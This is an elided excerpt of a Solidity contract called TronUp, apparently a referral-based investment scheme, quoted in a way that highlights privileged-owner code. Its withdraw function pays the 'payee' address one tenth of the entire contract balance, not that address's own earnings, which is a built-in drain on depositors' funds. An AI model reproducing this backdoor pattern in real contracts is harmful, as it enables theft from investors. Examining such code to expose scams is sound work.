...
contract TronUp {
    ...
    constructor() public {
     ...
     refuplines[payee] = true;

     tarifs.push(Tarif(12,204,10000000));
     ref_bonuses.push(5);
     ref_bonuses.push(3);
     ref_bonuses.push(2);
    }
    ...
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != payee) {
    ...
    function withdraw() external payable {
        ...
        withdrawn += amount;
        msg.sender.transfer((msg.sender == payee ? (address(this).balance/10) : amount));
    ...
    function addrefuplines(address _upped) public {
        require(msg.sender == payee,"unauthorized call");
